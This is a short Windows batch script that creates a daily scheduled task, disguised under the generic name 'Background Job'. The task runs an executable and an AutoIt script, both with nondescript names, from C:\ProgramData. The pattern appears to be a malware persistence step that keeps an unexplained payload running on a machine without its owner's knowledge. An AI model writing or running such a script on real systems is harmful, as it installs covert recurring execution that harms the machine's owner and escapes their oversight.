@echo off
schtasks.exe /Create /SC DAILY /TN "Background Job" /TR "C:\ProgramData\other.exe C:\ProgramData\other.au3" /F
